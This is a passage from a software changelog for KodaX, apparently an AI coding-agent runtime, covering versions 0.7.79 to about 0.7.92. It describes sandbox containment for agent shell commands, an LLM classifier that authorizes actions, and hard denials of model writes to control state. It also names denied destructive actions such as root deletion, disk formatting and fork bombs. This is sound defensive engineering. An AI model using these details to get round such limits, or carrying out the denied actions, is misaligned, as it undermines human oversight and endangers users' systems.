  host-owned: a non-empty CLI `uiHistory` decides whether they were displayed,
  while headless/no-cache restore still derives them from messages.

### Changed

- `sandboxRuntime` advances to v4 for stale coordinator-ticket and
  recorded-release convergence,
  and `crashOutcomeModel` advances to v2 for the terminal-commit ordering. Both
  capabilities are exported as pre-start SDK facts so hosts can replace an idle
  stale daemon or fail closed while it is busy.
- Generic file-lock timeouts now use `KodaXFileLockTimeoutError` instead of the
  misleading learning-specific message. Sandbox-to-ordinary execution fallback
  remains unchanged: both paths must acquire the same filesystem-effect fence,
  so an unproven coordinator state is never bypassed or replayed.

---

## [0.7.91] - 2026-08-17

### Added

- The Runtime SDK now exports `settleKodaXRuntimeExit()` and the local
  `runtimeExitSettlement:1` capability. A complete host exit persists the
  exact owner before stop, resumes through a durable settlement ticket, and
  repairs only verified Windows process/Job/ACL residue. Same-boot POSIX
  recovery remains fail-closed until a durable boot-identity change proves the
  retained tree cannot still be running.
- Standalone Bun binaries now bundle the lazy Anthropic and OpenAI SDK
  dependency graphs, including transitive packages that were previously
  resolved from filesystem `node_modules`.

### Fixed

- Provider retries, fallback, output-budget escalation, and max-token
  continuation now share an SDK-owned output-segment contract. Streaming no
  longer receives a second cumulative append during recovery; raw Runtime
  journals retain abandoned attempts while live snapshots expose only the
  effective response.
- Auto-starting Runtime clients require `liveOutputSegments:1` and replace an
  incompatible daemon only after a read-only capability probe and fenced
  management prove that no other client or governed work still owns it. The
  replacement reuses crash-resumable exit settlement, exact process identity,
  complete process exit, and verified cleanup. Attach-only clients fail closed;
  hosts no longer need checkpoint/text replay compatibility paths.
- Standalone Bun binaries now bundle the Anthropic and OpenAI SDK dependency
  graphs while retaining first-use lazy loading, so provider startup no longer
  falls back to filesystem `node_modules` resolution or fails on transitive
  packages such as `standardwebhooks`.
- Runtime user-input and permission lifecycles now carry an owner AbortSignal
  and independent bounded deadlines. AskUser defaults are validated at the
  Runtime boundary, MCP elicitation cancels on expiry, and SDK permission UI
  can use `handleRuntimePermissionRequest()` so a late answer cannot revive a
  settled interaction.

### Changed

- Provider subclasses that access the protected SDK client directly must now
  use `await getClient()`. Synchronous `buildClient()` overrides remain
  supported, but the base Anthropic/OpenAI loaders are asynchronous so Bun can
  discover and embed their literal dynamic imports.
- Runtime live output is projected by logical `responseId` and physical
  `providerRequestId`. Replacement removes only the active failed segment,
  continuation appends, and stale provider deltas are ignored; raw journals
  still retain the complete audit trail.
- Interactive REPL persistence now retries a prepared Session tail through a
  full authoritative delta after a `data_changed` race. Background persistence
  failures surface as diagnostics, and stale prepared-session tails are merged
  instead of silently dropping the latest UI/session state.

### Documentation

- Synchronized package metadata, product/architecture/design documents,
  public SDK embedder guidance, `kodax_manual`, release checklist, feature
  design index, known-issue record, and regression guide for v0.7.91.

> v0.7.91 intentionally includes Runtime/daemon, Coding runtime, LLM binary
> packaging, and REPL-facing SDK contract changes. npm publication remains a
> separate manual operator step.

## [0.7.90] - 2026-08-17

### Fixed

- Workspace session RPC timeouts no longer force-kill the shared ASRT session:
  a timed-out wrap/cleanup now fails its pending requests and retires the
  session through the orderly close path (lease drain + Windows reset grace),
  so a slow shared-queue cleanup can no longer poison the durable Windows ACL
  owner marker as `unconfirmed-owner-*` for the rest of the boot.
- Workspace session cleanup RPCs use the 130s Windows reset-grace budget
  instead of the generic 30s RPC deadline on every platform, since cleanup
  resets shared ACL/WFP state and may wait behind in-flight wraps on the
  session's serial queue.
- Daemon log diagnostics keep Error details diagnosable: `detail` payloads
  serialize `name`/`message` plus `AggregateError.errors[]` and `cause` chains
  instead of collapsing to `{}`.
- Run-scoped tool materialization normalizes open lease/embedder input schemas to
  the provider contract (`type: object`, `properties`, and valid string
  `required` entries), so Anthropic-compatible requests cannot be rejected by a
  missing schema type. Archive markers also stay attached to a retained direct
  predecessor when one-hop clone retention keeps that predecessor alive.
- Chained-compaction clone provenance now addresses the direct physical
  predecessor copy instead of the transitive root source, and archive
  collection never removes an entry that a retained clone physically
  references. Together these eliminate the double-booked `logicalId` shape
  that could make repeated compaction resolve as ambiguous history;
  `sourceEntryId` semantics for hosts change from "root physical source" to
  "direct physical predecessor" (see the SDK embedder guide).

### Documentation

- Synchronized package metadata, release notes, architecture/product/design
  baselines, feature tracking, public SDK guidance, `kodax_manual`, and
  regression coverage for the v0.7.90 stabilization release.

> v0.7.90 intentionally includes Runtime/sandbox, Agent lineage, Coding
> runtime, and REPL persistence system-code fixes. npm publication remains a
> separate manual operator step.

---

## [0.7.89] - 2026-08-16

### Fixed

- Managed compaction context replacement no longer makes a topology-valid
  ordinary conversation ambiguous or exposes physical branch/copy duplicates.
  Conversation page-cache v3 is invalidated so affected Sessions rebuild the
  corrected projection after upgrade, and the incremental append fast path
  passes managed-context envelopes through without projecting them, so
  managed-heavy Sessions keep warm page caches.
- Managed-context transparency now keys on the `_source` tag alone (matching
  the compaction stripping side) and also covers the lineage-unavailable
  fallback projection.

### Added

- Host Tools first-class visibility (`FEATURE_294`): host tools bound to a
  run by lease now materialize into the agent tool table as run-scoped
  definitions (name + schema) on both the SA and managed-agent paths, so
  models see them without calling `mcp_search`. The cached capability
  catalog gains a `## Host Capability Provider (run-bound)` line
  advertising the bound server entry, tool names, and a content-hash
  revision that stays stable across runs. The `runBoundHostTools`
  capability bumps to `2` (`materializedAgentTools`).
- Resilient zero-service web search (`FEATURE_293`) now tries DuckDuckGo HTML,
  Bing RSS, and Bing HTML in a bounded order, preserving truthful fallback
  diagnostics, normalized direct URLs, freshness metadata, and isolated custom
  endpoint behavior without adding a hosted service or runtime dependency.

### Changed

- Materialized host tool dispatch routes through the run's capability
  channel (`executeCapability('mcp', 'host:<leaseId>:<name>')`), reusing the
  reverse-bridge timeout/idempotency/invocation state machine; results
  render through the `mcp_call` retrieval pipeline. Host tool descriptors
  map conservatively: `none` → readonly + plan-mode allowed,
  `idempotent`/`non_idempotent` → mutates-state + plan-mode blocked
  (fail-closed). Revoking a lease removes the materialized tools and the
  catalog line from subsequent turns.
- Run bindings whose host tool names collide with registered tools are
  rejected up front with `invalid_params` (before any host-tool run
  record), and host tool lease ids must match
  `[A-Za-z0-9][A-Za-z0-9_-]{0,127}` (colon stays reserved for capability
  ids).
- Remote managed agents (A2A) can now authorize host capability ids: the
  `authorizeMcp` id pattern accepts `host:` leases and role tool policy
  carries host tool authorization semantics.

### Documentation

- Updated the release checklist, product/architecture/design baselines,
  feature tracker, public guides, `kodax_manual`, and v0.7.89 regression
  guides for FEATURE_293, FEATURE_294, and Issue 293.

---

## [0.7.88] - 2026-08-16

> Git tag and GitHub Release are created by the release workflow. npm
> publication remains a separate manual operator step.

### Changed

- Actor settlement persistence now separates Actor mutation order, process-local
  storage dequeue, writer eligibility, cancellable pre-commit work, canonical
  replacement, and serialized post-commit maintenance. The v2 contract is
  exposed as `actorSettlementConvergence:2`.
- Startup and resume paths bound their work and defer heavy provider, image,
  LSP, TypeScript, and extension dependencies past the bootstrap boundary.
- `zai-coding` and `ark-coding` now default to `glm-5.3` while retaining
  `glm-5.2`; Ark retains the `glm-latest` alias. Coding Plan model IDs are sent
  verbatim, without a synthetic context suffix. GLM-5.3 `off` / `none` intent
  is normalized to low effort.

### Fixed

- Issue 292: storage eligibility, canonical Actor settlement, and post-commit
  maintenance no longer compete for one deadline; authoritative persisted-shape
  readback resolves explicit replacement errors and maintenance failures no
  longer roll back a successful terminal Actor state.
- Guardrail decision diagnostics now expose a bounded classifier reason.
- REPL startup learning-recovery notices are dismissed after the first submitted
  query instead of remaining stale over the active conversation.
- CLI bundle startup no longer eagerly imports the Anthropic SDK or `jimp`,
  restoring the audited startup dependency boundary.
- Known-issue tracker totals are synchronized with the Issue 292 resolution.

### Documentation

- Synchronized README/README_CN, PRD/HLD/DD/ADR, feature tracker, public SDK
  guides, `kodax_manual`, `docs/features`, release checklist, and v0.7.88
  regression coverage.

---

## [0.7.87] - 2026-08-14

> Git tag and GitHub Release are created by the release workflow. npm
> publication remains a separate manual operator step.

### Changed

- `zhipu-coding` now defaults to GLM-5.3 with its 1M context and 128K output,
  while retaining GLM-5.2 as an explicit rollback route. `zai-coding` retains
  both models but defaults to GLM-5.2 until the overseas account/plan rollout
  grants GLM-5.3 access. The ordinary `zhipu` provider pre-registers the same
  GLM-5.3 metadata without promoting it while the public pay-per-token API is
  still marked as upcoming.
- GLM-5.3 exposes the upstream low/high/max effort contract: none, minimal,
  light, and low lower to `low`; medium/high lower to `high`; xhigh/max/ultra
  lower to `max`. Anthropic-compatible calls use adaptive thinking plus
  `output_config.effort`; OpenAI-compatible calls use enabled thinking plus
  `reasoning_effort`.

### Fixed

- Zhipu Coding Plan model IDs are sent verbatim (`glm-5.3` / `glm-5.2`). The
  invalid `[1m]` suffix previously caused upstream `1214 modelCode does not
  exist` failures even though the logical model was available.
- GLM-5.3 `off` / `none` no longer sends the unsupported disabled-thinking
  shape. It lowers to enabled low-effort thinking, matching the always-thinking
  upstream contract and preventing `1210` request failures.
- REPL effort controls no longer offer an impossible `off` rung for GLM-5.3;
  legacy saved `off` intent is classified and displayed as `off->low`.

---

## [0.7.86] - 2026-08-14

> Git tag and GitHub Release are created by the release workflow. npm
> publication remains a separate manual operator step.

### Fixed

- Windows sandbox doctor and required Shell calls now surface actionable ACL
  crash-recovery guidance for legacy or corrupt owner markers instead of a
  generic unavailable result. Sandbox setup is serialized with owner admission
  and cannot mutate account, guard, or WFP state while any sandbox owner or
  unresolved poison marker exists for the shared Windows sandbox account. New owner markers
  remain readable by older runtimes, while atomic-write staging files are kept
  outside the legacy marker directory.
- Windows workspace Shell sessions now derive bounded read grants from each
  command's final PATH and shell executable. Existing lexical and canonical
  directories are admitted exactly; junction targets receive only the minimum
  traversal ancestors below their profile application root, so version managers,
  shims, virtual environments, and sibling runtime files work without naming
  individual tools or exposing broad Documents/AppData vendor trees. Windows
  shares one effective policy scope across compatible commands and confirms ACL
  reset before switching to an incompatible scope. Standalone SDK calls,
  workspace sessions, and duplicate SDK module copies use the same machine-wide
  policy-owner protocol across Runtime profiles and KodaX homes, so incompatible
  grants cannot combine through the shared Windows sandbox identity. The
  target receives a case-normalized environment and preserves the Windows
  verbatim-argument contract, so
  profile-managed executables and quoted path arguments survive both broker layers.
- Auto-started Runtime clients now require sandbox execution capability v3, so
  an idle daemon from KodaX 0.7.85 or the earlier v2 execution policy is replaced only after its durable shutdown
  outcome and Windows Job supervisor prove the old process tree is empty. A
  daemon without that verification contract remains fail-closed and must be
  stopped explicitly before the repaired Shell chain is exposed.
- The first upgrade from a Runtime that predates the machine-wide Windows
  sandbox-owner protocol requires all unmanaged legacy KodaX/Space processes
  (including standalone SDK processes using another KodaX home) to be stopped.
  Those binaries cannot participate in the new global owner lock; current and
  future runtimes are serialized machine-wide after the transition.
- Clean Windows workspace-session shutdown now honors the sandbox runtime's full
  ACL reset budget before escalating to process-tree termination, while unclean
  or unverified exits remain durably fail-closed.
- Windows Shell sessions now share one ACL policy group when their normalized
  workspace, Agent Home access, additional filesystem permissions, toolchain
  scopes, and network policy are identical. Compatible commands can run in
  parallel across independent KodaX processes; the last policy-group member confirms
  reset before releasing its owner. Different policies fall back immediately
  to the already-authorized ordinary execution path instead of blocking on a
  machine-wide sandbox fence. Preparation failures use the same fallback, while
  a command that started or may have started is never replayed implicitly.
- Filesystem-effect coordinator handoff now waits through the lock protocol's
  30-second stale-owner safety window. Slow or rapid cross-process handoffs no
  longer fail at five seconds, while real cross-category effect conflicts keep
  their existing one-second fail-closed admission boundary.
- Runtime Shell containment is now sandbox-first rather than sandbox-required.
  Auto[LLM] remains the single authorization decision, successful allow results
  are cached only for the same Runtime-session intent revision, and unavailable
  sandbox infrastructure uses normal permission enforcement without another
  classifier call. Catastrophic root deletion, disk formatting/raw disk writes,
  fork bombs, and Agent Home root/control-plane destruction remain deterministic
  hard denials. The obsolete public `failClosed` switch has been removed.
- The packaged Electron regression smoke now runs 20 Runtime Shell commands
  through a profile-added junction toolchain, resolves the packaged Node binary
  through its version-manager ancestry, exercises a quoted `cmd.exe` path, and
  keeps its probe I/O inside the admitted workspace.
- Packaged Electron hosts on Windows now keep Electron's Node bootstrap mode
  across the internal filesystem-effect gate without leaking it to user
  commands. Sandbox readiness uses KodaX's staged runner outside ASAR, failed
  workspace sessions are retired, stale ACLs are recovered before startup and
  after the last compatible sandbox owner exits, and an execution with missing
  attestation is reported without replaying a possibly side-effecting command.
- Sandbox stop now waits for process-tree termination proof before ACL recovery;
  undrained Shell effects and spawn/cleanup failure combinations are reported as
  lifecycle safety errors. Windows ACL owner markers admit only an exact shared
  policy group for the machine sandbox identity, and crash recovery is serialized
  across Runtime profiles.
- Inline Runtime owner recovery now removes only a provably abandoned inline
  owner fence before restoring daemon policy. Live, unreadable, legacy-kind,
  daemon-kind, and unverifiable owners remain fail-closed, while a failed
  inline-owner release remains retryable.
- Runtime owner records and learning-file locks now retain an OS process-start
  identity, so a reused PID cannot keep stale ownership alive.
- Windows sandbox lifecycle failures now wait for termination proof, preserve
  cleanup evidence, fence later filesystem effects, and never replay a command
  whose effect process was not proven drained.
- POSIX sandbox workspace sessions now latch an unconfirmed process-tree or
  cleanup failure and reject replacement sessions until the safety state is
  reset, matching the fail-closed lifecycle contract across platforms. Fresh
  `KODAX_HOME` policy roots are initialized before policy identity is captured,
  concrete admissions wait only for their workspace-local warm-up within the
  existing Shell abort/deadline, and a failed lease cleanup retires the invalid
  cached session before replacement.

---

## [0.7.85] - 2026-08-11

> Git tag and GitHub Release are created by the release workflow. npm
> publication remains a separate manual operator step.

### Changed

- Runtime event ordering is now Session-scoped. Every event carries a
  `{ sessionId, journalEpoch, seq }` cursor; public subscribe/replay calls must
  specify `sessionId` or `runId`, and replay resumes from `after` rather than a
  Runtime-global numeric sequence. Independent Sessions no longer contend on
  one `event-sequence.lock`.
- A2A assigns one Runtime Session to each A2A Task and persists that Session
  cursor in a small progress checkpoint for recovery, avoiding a full
  `tasks.json` rewrite per micro-event. Only semantic task-state transitions
  are projected to the A2A stream; token/tool progress remains Runtime telemetry.
- Daemon clients require the `sessionEventJournal:1` capability. Legacy global
  Runtime event logs remain on disk for audit but are not mixed into live
  Session replay.
- Session failure latches and retention watermarks are journal-scoped. Reusing
  a deleted Session ID rotates the epoch, ambiguous Windows path components remain
  distinct, malformed cursors and mismatched Session/Run scopes fail closed,
  legacy watermarks without an epoch cannot poison new replay, and a durable
  per-Run journal index keeps fully trimmed child journals attributable if a
  watermark is later corrupted. Missing or corrupt index evidence fails closed
  instead of treating an ambiguous trimmed journal as unrelated.

### Fixed

- Memory/Learning command output is now rendered through the Ink-captured
  command channel instead of raw stdout. `/learn` reports an explicit empty
  state, `/learn ready` is the canonical ready-capability query, and the legacy
  `/learn pending` alias explains that it is unrelated to episode-review work.
  Memory management is now conversation-first: explicit remember, correction,
  forget, recall, and exceptional-decision requests use one governed hidden tool.
  Safe explicit mutations apply immediately; stable semantic claim keys make
  later contradictions address the same fact/preference/policy/procedure slot.
  A host-owned handled-operation marker prevents the instruction from being duplicated
  into the outcome review, while the rest of the episode still participates in
  autonomous Memory/Skill learning. Ambiguity and broad input request
  clarification, conflicts become readable decisions, secrets are rejected,
  and inferred changes stay governed. `/memory` remains a compact advanced escape hatch for accepted
  Memory, decisions, diagnostics, and external-editor opening. Raw review/status
  and derived-index rebuild commands remain hidden diagnostics; `MEMORY.md` is a
  projection rather than the source of truth. The
  `@kodax-ai/kodax/experimental-memory` factory now returns an additive
  `MemoryManagementAgent` only for a management-capable controller, exposing
  list, remember, and forget without widening the existing
  `MemoryAgent`/`MemoryController` structural contracts. Natural-language
  decision handles carry their preview revision across turns and fail closed if stale.
- Unified Memory review accepts a minimal model-owned action/warning plan and
  binds trigger, timestamps, source/candidate references, and digest authority
  on the host. This removes redundant schema work that caused GLM providers to
  return invalid plans without weakening deterministic action validation.
- Issue 282 follow-up: Actor progress is now batched once per controller tree,
  terminal persistence excludes known mutation-queue waits from its five-second
  ambiguity budget, and a permanently blocked predecessor remains bounded by a
  separate queue-wait fence. Progress promises also reject when an ownership
  conflict self-fences their controller instead of remaining pending forever.
- A durability-unknown Actor tree now fail-closes its owning root executor and
  automatically reconciles only an exact same-owner late snapshot. Runs settle
  as `actor_settlement_not_persisted` unless a stronger executor Promise fact
  was captured before the fence. Same-owner durable repair plus root abort and
  post-fence admission suppression closes the Session route after every exact
  tool execution admitted before the fence has settled. It does not wait for
  an abort-ignoring provider Promise; callbacks and new Runtime-mediated effects
  from the fenced root remain blocked.
- Healthy `after_turn` input keeps the established coding-mode default. It
  inherits a managed predecessor's mode only when it actually drains behind an
  Actor durability repair.
- Self-fenced Actor admission now reports the causal settlement-persistence
  error instead of the misleading `actor_owner_conflict`. Genuine foreign-owner
  conflicts remain fail-closed.
- Runtime capability negotiation now exposes `actorSettlementConvergence:1`,
  including automatic repair and safe after-turn queueing behind an unknown Run.
- Issue 286: Learned Skill discovery now traverses the distinct remote and local
  hashed project roots and routes every canary mutation to the record's owning
  store. `remote-hash:*` receives the same local fallback, while the public
  deprecated `expectedScope` configuration remains source/runtime compatible
  with the optional multi-scope form.
- Issue 285: Rules-mode agent-home access now protects the home root from whole-
  tree removal, hard-denies Runtime mutations, and reviews credential/security
  config plus generic sensitive filenames.
  The legacy `processes/children` registry is now treated as host control state:
  model writes are hard-denied, and upgrade cleanup quarantines unauthenticated
  historical records without using them to signal a process.
  Learned Area persistence is also host-owned and no longer directly writable
  by model file or shell tools.
  Ordinary descendants—including `agents/*.md`, Sessions, tool results, and
  intermediate artifacts—remain readable and writable without approval.
- Issue 285 execution-time file sinks now recheck the hard boundary after
  queueing. Undo backups are context-scoped and identity-fenced, while workflow
  worktree roots are accepted only through the trusted controller context.
  Agent Home root and Runtime shell mutations use a non-authorizable gate in
  both Auto[LLM] and Auto[Rules]; sensitive configuration remains reviewable.
  A cross-process category lease prevents model-started shell effects from
  racing a privileged file sink's canonical check and write without serializing
  independent shell calls or independent direct-file mutations.
- Every coding run now carries a non-removable Agent Home shell boundary.
  Opaque Bash requires a fail-closed OS sandbox with authoritative process-tree
  containment; unsandboxed or filesystem-only standalone callers
  may run only completely modeled exact commands. Runtime supplies that sandbox
  in every permission mode and fails closed when preparation is unavailable.
  Linux uses the built-in ASRT PID namespace and Windows adds a per-effect Job;
  macOS and legacy custom adapters without the optional containment capability
  retain exact modeled commands but fail closed for opaque Bash.
  Protected Agent Home reads still require review, but are not permanently
  denied by the OS sandbox after an explicit approval.
  On Windows, ACL grants target verified ordinary Agent Home children rather
  than the Home object itself, so `agents`, Sessions, and intermediate results
  remain writable without granting permission to delete the whole Home root.
- Session event replay now rejects cursors ahead of the current journal instead
  of silently returning no events. Limited replay retains the latest-event
  behavior without a cursor and returns the earliest forward page when `after`
  is supplied; replay limits must be positive safe integers. Corrupt aggregate
  journal/status metadata is reported without widening the failure to unrelated
  Sessions, valid retired journals are not misreported as corrupt, and A2A
  regression coverage pins legacy numeric event positions as non-cursors.

---

## [0.7.84] - 2026-08-07

> Git tag and GitHub Release are created by the release workflow. npm
> publication remains a separate manual operator step.

### Fixed

- Issue 282: Agent progress persistence is now backpressured and coalesced to
  one in-flight write plus one latest replacement. Terminal settlement no
  longer waits behind an unbounded progress backlog and exposes an explicit
  durability-unknown state when the remaining write cannot settle in time.
- A same-owner Stop can reconcile a late Actor snapshot after settlement
  timeout, durably quiesce remaining children, and retry the repair on a later
  Stop. Foreign owners, missing snapshots, and persistent storage failures
  remain fail-closed.
- Promise success/failure facts are retained while Actor durability is unknown
  and outrank fallback terminal callbacks after repair. A stale durable unknown
  status cannot rewind an already terminal local Run, duplicate cancellation
  effects, or emit conflicting terminal events.
- A quiesce with no eligible turn is now a true no-op and avoids an unnecessary
  Session snapshot rewrite.

### Documentation

- Updated the release baseline, SDK embedder guidance, `kodax_manual`, feature
  design index, regression guides, and known-issue disposition for Issue 282.

---

## [0.7.83] - 2026-08-06

> Git tag and GitHub Release are created by the release workflow. npm
> publication remains a separate manual operator step.

### Added

- Windows daemon startup now assigns the Runtime process to a kill-on-close Job
  Object before user code can run. The public
  `waitForRuntimeDaemonShutdown()` verifier combines the exact durable cleanup
  outcome with daemon and containment-supervisor exit, advertised by
  `daemonShutdownVerification:1`.

### Fixed

- Daemon final cleanup can safely retire incomplete current-owner child
  registry records when kernel Job containment is active. Per-child synchronous
  process-exit hooks are omitted in that mode, avoiding listener growth and
  repeated PowerShell tree scans during shutdown. CLI stop now waits for the
  containment boundary as well as the daemon PID before reporting success.
- Existing Windows daemons are no longer forced through a lock-only capability
  upgrade merely to restore Sessions. Shutdown verification remains explicitly
  negotiable; a legacy daemon must be stopped and relaunched before callers can
  require the new containment contract.
- Review hardening closes the Windows Job-assignment failure path by terminating
  and waiting for a still-suspended daemon before its process handles are closed.
  This prevents an uncontained orphan when kernel Job assignment fails.

---

## [0.7.82] - 2026-08-05

> Git tag and GitHub Release are created by the release workflow. npm
> publication remains a separate manual operator step.

### Fixed

- Daemon Host Tool capability discovery now preserves complete, lease-scoped
  snapshots when it composes them with the active MCP runtime. Explicit server
  filters select only their requested source, unfiltered discovery stays
  complete/live, and legacy providers are queried without the ordinary page cap
  while retaining explicit degraded metadata (Issue 279).
- A recorded managed-Run Stop now fences provider retry/fallback/continuation,
  guardrail, tool, and Actor work after cooperative cancellation is observed.
  The trusted Stop/Abort cause is classified before credential redaction, so
  status, terminal event, `runs.get()`, and `runs.await()` consistently report
  interruption without overriding genuine completion or independent failures
  (Issue 280).
- `runtime.runs.submitInput()` and daemon preflight now resolve the admitted
  authoritative Run before reading mutable Session history. Active interrupt
  and after-turn admission no longer fail with transient `data_changed`; queued
  continuations still wait for predecessor settlement and retain exact
  operation-id idempotency (Issue 281).

---

## [0.7.81] - 2026-08-05

> Git tag and GitHub Release are created by the release workflow. npm
> publication remains a separate manual operator step.

### Added

- Delivered Runtime interrupt inputs now expose an `entryId`: the exact physical
  Session-lineage entry created by canonical user-input persistence. The value
  is available in both `RuntimeInterruptInputStatus` and the
  `run.input.delivered` event payload, so an SDK host can correlate a completed
  interrupt with conversation history without reconstructing ordinal position.

### Changed

- A safe-boundary drain keeps every queued user prompt as its own transcript
  message and passes the per-queue-id `queuedMessageEntryIds` mapping through
  the Runner/Runtime boundary. A delivered batch is therefore ordered and
  referentially exact even when it contains multiple prompts.

### Fixed

- Runtime-owned Session persistence completes before an interrupt is reported
  as delivered. Missing, ambiguous, or failed canonical persistence now fails
  delivery closed; no durable delivery event or delivered status is published.
  The canonical entry reference survives event replay, Session compaction, and
  Runtime restart. Legacy persisted delivery records remain readable without an
  `entryId`.

---

## [0.7.80] - 2026-08-04

> Git tag and GitHub Release are created by the release workflow. npm
> publication remains a separate manual operator step.

### Added

- Runtime SDK capability negotiation now advertises `managedRunDurability` v1,
  allowing embedders to reject or safely replace daemons that do not guarantee
  canonical managed-Run boundaries.
- The CLI honors `worker.configuredA2A` in `~/.kodax/config.json`: the embedded
  Runtime is created Worker-hosted with the configured A2A plane installed
  inside the Worker owner, so configured outbound A2A Agents appear as
  `external:<name>` in `list_dispatchable_agents` and can be dispatched with
  `spawn_agent`. The function-valued inline `externalAgents` plane is skipped
  in that mode because it cannot cross the Worker boundary, and the mode
  rejects configured MCP servers or Extensions. Config templates document the
  `worker` block.
- `@kodax-ai/agent` now exports the structured `RunnerIterationLimitError` and
  `isRunnerIterationLimitError` guard. A Runner that exhausts its mechanical
  tool-loop fuse fails with `code: 'RUNNER_ITERATION_LIMIT'` and carries the
  last legal transcript, readable through `readRunnerRecoveryTranscript`, so
  callers can distinguish a runaway tool loop from other failures.

### Changed

- Public `countTokens` / `estimateTokens` keep their existing signatures but
  now use a provider-neutral O(n) multilingual and dense-data estimate instead
  of synchronous `cl100k_base` BPE tokenization.
- Managed AMA turns now bound one uninterrupted `Runner.run` tool loop by a
  500-iteration mechanical panic fuse instead of being unbounded. Each
  idle-yield resume starts a fresh Runner invocation and resets the counter, so
  the fuse is a runaway-loop breaker, never a cumulative task budget; the
  managed-task idle-yield lifecycle itself remains unbounded. Iteration events
  report the real fuse and a fuse exit keeps the recovery transcript and
  checkpoint available for diagnosis or resume.

### Fixed

- Direct `@kodax-ai/coding` SDK guardrails now use the same deterministic
  filesystem, shell, and Git permission analyzer as the REPL, so ordinary
  project `read`/`grep`/`glob` and read-only shell calls no longer depend on
  host-specific analyzer wiring. Classifier truncation recognizes
  OpenAI-compatible `length`, with default attempt deadlines of 45s and 90s;
  an explicit `timeoutMs` remains authoritative for both attempts.
- Oversized tool output is byte/line-spilled before token estimation, avoiding
  main-loop stalls on long Base64/ASCII output while preserving a bounded
  preview and complete artifact.
- Runtime-owned managed Runs durably save the initial accepted prompt, each
  completed turn, and each queued prompt before publishing the corresponding
  lifecycle event. Required persistence failures fail closed, and queued turns
  are not started until their user input is canonical.

- Auto permission analysis no longer treats ordinary grep/glob/directory and
  Git metadata/content reads as unresolved, and no longer invents an unknown
  effect for tools with trusted side-effect metadata — GET-only `web_fetch` is
  reclassified as a network read. A classifier response truncated by
  `max_tokens` is retried once with a 1024-token output budget instead of
  repeating the same impossible 256-token attempt (Issue 275).
- Managed runs can no longer spin in repetition loops across idle-yield child
  completions: bounded managed-run/runtime context projections, stall
  detection, verifier-recorder and LLM-judge convergence, and worker-role
  prompt guidance keep repeated convergence stable while parallel review is
  restored.
- `quality_strategy` Actor-Turn evidence refs stay inside the executing
  Actor's controlled subtree: same-parent sibling provenance is rejected as
  outside the visibility boundary, while unknown actors and stale exact turn
  refs drop the optional telemetry without blocking the underlying legal Actor
  operation.
- Parallel delegation guidance is tightened so independent work lanes fan out
  through ordinary Actor operations while genuinely indivisible or strongly
  serial work stays solo, without re-opening the managed-run repetition
  regression.
- CLI sessions on a Worker-hosted embedded Runtime now reduce run options to
  the JSON-safe wire DTO before crossing the Worker transport boundary: host
  callbacks (`events.beforeToolExecute`, `onTextDelta`), session storage,
  memory identity, and the host-owned extension runtime are stripped, matching
  daemon-mode sanitization instead of crashing with
  `RuntimeTransportBoundaryError`. Daemon mode itself keeps its loud
  host-binding rejection — a configured `events.beforeToolExecute` or
  `extensionRuntime` still errors instead of being silently disabled; only
  Worker-hosted embedded Runtimes strip them.

## [0.7.79] - 2026-08-03

### Added

- Qwen Token Plan now defaults to the production `qwen3.8-max` Model ID while
  retaining `qwen3.8-max-preview` as an explicit compatibility choice. Both
  routes keep the 1M context, always-on reasoning, and image-input contract;
  Qwen 3.8 metadata now reflects the documented 131,072-token output limit.
- Configured outbound A2A Agents now support independent, persisted,
  default-deny authorization for private addresses and non-loopback plaintext
  HTTP through `--allow-private` and `--allow-insecure-http`.
- Worker-hosted embedded Runtimes can opt into the built-in configured A2A
  plane with `worker.configuredA2A`, including list/describe/preflight and real
  external Actor dispatch.
- Runtime SDK consumers can inspect one authoritative Session status, export
  byte-preserving Session bundles, and capture bounded read-only diagnostics
  across embedded and daemon modes.
- Session and Runtime SDK consumers can read an immutable ordinary-conversation
  projection that folds only provenance/topology-proven compaction copies,
  reports unresolved legacy ambiguity, and supplies revision-fenced
  fork/rewind boundaries while leaving raw transcript audit data unchanged.
  Standalone session consumers receive the same mutation boundary contract.
- User-level `sandbox.envPass` now accepts an exact list of host environment
  variable names to expose to model-issued command targets, including ASRT and
  the ordinary fallback path. The default remains empty; configuration stores
  names rather than values, project configuration cannot broaden the list, and
  execution-control variables remain blocked. Commands can read and emit any
  variable that the user explicitly allows. SDK callers can supply the same
  Run-scoped setting through `KodaXOptions.sandbox`, including Worker and daemon
  transports, without mutating process-global configuration.

### Changed

- Runtime streaming text/reasoning deltas are coalesced into bounded,
  flush-aware event batches, reducing sequence allocation, durable event-log
  writes, and subscriber pressure without changing the reconstructed stream.
  Hosts can require `runtimeEventCoalescing:1`; auto-start replaces only an
  idle legacy daemon, and every accumulated merge remains bounded to 8 KiB.
- MCP transport environment values now expand the supported environment
  reference forms consistently before process launch.
- OpenAI-compatible custom providers can select `max_tokens` or
  `max_completion_tokens` with `maxOutputTokensField` at provider or per-model
  scope. DeepSeek V4 now uses distinct Flash and Pro reasoning profiles, is
  correctly advertised as text-only, and uses the current base/cache rates in
  cost tracking.
- Explicit `sessions.load()` calls are read-only snapshot lookups and no longer
  emit a durable `session.loaded` event. Provider Run binding retains the
  compatibility event at the actual execution boundary.
- Windows process-tree cleanup now distinguishes verified termination from
  observable uncertainty and avoids bare-PID kills. Snapshot ancestry is not
  kernel containment, however: if an intermediate process exits before a later
  snapshot, an already-running descendant can become unobservable. Issue 256
  remains open and is scheduled for v0.7.84, when spawn-time Job Object
  containment and Worker owner leasing close that gap.

### Fixed

- The dual-layout CLI resume scan no longer resurfaces migrated
  `archived-*.jsonl` Sessions from project subdirectories, and empty persisted
  conversations now resolve as a valid empty lineage instead of a missing-
  lineage diagnostic (Issue 264).
- Side queries now reserve a bounded 1024-token low-thinking window in addition
  to the caller's final-answer allowance when a model cannot disable reasoning,
  including friendly custom-provider profiles that omit `off`. This prevents
  impossible `max_tokens=256` / `budget_tokens=1024` classifier requests; the
  default classifier deadline is now 30 seconds while explicit overrides remain
  authoritative (Issue 270).
- MCP stdio `close()` now reports a retryable incomplete-cleanup error whenever
  descendant termination is unverified, including after natural root exit,
  instead of returning success while blocking the next `open()`. Production
  CLI/Runtime imports now use Agent package entrypoints, and daemon shutdown
  outcomes retain a bounded 32-owner multi-reader verification window instead
  of accumulating without limit or disappearing after the first stop client.
- Revision-fenced conversation forks now enforce the existing bounded Session
  read budget throughout synchronous lineage projection without changing
  `sessions.load()` or ordinary resume paths. Windows child capture retries one
  complete process snapshot when a newly spawned root is initially absent;
  Git read-only parsing now detects mutation flags anywhere in a short-option
  cluster, and the daemon close-hang fault injection is gated to test mode.
- Runtime daemon stop now verifies complete process-level cleanup with an exact
